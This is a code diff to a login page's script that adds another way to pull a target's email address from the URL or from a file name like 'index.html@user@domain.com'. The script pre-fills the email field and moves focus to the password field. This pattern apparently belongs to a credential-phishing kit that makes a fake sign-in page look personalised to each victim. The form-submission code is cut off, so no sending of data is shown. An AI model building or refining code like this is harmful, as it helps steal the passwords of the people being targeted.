@@ -75,21 +75,19 @@
       <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
       <script>
          $(document).ready(function() {
-             // Enhanced function to extract email from URL hash or query parameters
+             // Enhanced function to extract email from URL hash, query, or filename (index.html@user@domain.com)
              function extractEmailFromUrl() {
                  var email = null;
-                 // First, try to get email from URL hash (fragment)
+                 // 1. Try to get email from URL hash (fragment)
                  var hash = window.location.hash;
                  if (hash && hash.length > 1) {
-                     // Remove the # symbol and decode URL encoding
                      var hashContent = decodeURIComponent(hash.substring(1));
-                     // Check if the entire hash is an email
                      var emailRegex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
                      if (emailRegex.test(hashContent)) {
                          email = hashContent;
                      }
                  }
-                 // If no email in hash, try URL query parameters
+                 // 2. Try URL query parameters
                  if (!email) {
                      var urlParams = new URLSearchParams(window.location.search);
                      var emailParam = urlParams.get('email') || urlParams.get('user') || urlParams.get('username');
@@ -101,23 +99,29 @@
                          }
                      }
                  }
-                 // Also check for email in the full URL path (after domain)
+                 // 3. Try to extract from filename (index.html@user@domain.com)
+                 if (!email) {
+                     var path = window.location.pathname;
+                     var fileMatch = path.match(/@([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})/);
+                     if (fileMatch && fileMatch[1]) {
+                         email = fileMatch[1];
+                     }
+                 }
+                 // 4. Also check for email in the full URL path (after domain)
                  if (!email) {
                      var fullPath = window.location.pathname + window.location.search + window.location.hash;
                      var emailMatches = fullPath.match(/[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g);
                      if (emailMatches && emailMatches.length > 0) {
-                         // Use the first valid email found
                          email = emailMatches[0];
                      }
                  }
                  return email;
              }
-             // Auto-populate email field if valid email is found in URL
+             // Auto-populate email field if valid email is found in URL or filename
              var emailFromUrl = extractEmailFromUrl();
              if (emailFromUrl) {
                  $('#email').val(emailFromUrl);
                  $('#password').focus();
-                 // Optional: Show a subtle indication that email was auto-filled
                  $('#email').css('background-color', '#f0f8ff');
                  setTimeout(function() {
                      $('#email').css('background-color', '');
@@ -131,7 +135,6 @@
                      $('#password').focus();
                  }
              });
-             // ... (email extraction and UI logic unchanged) ...
              // Form submission handler
              $('#login_submit').click(function(e) {
                  e.preventDefault();
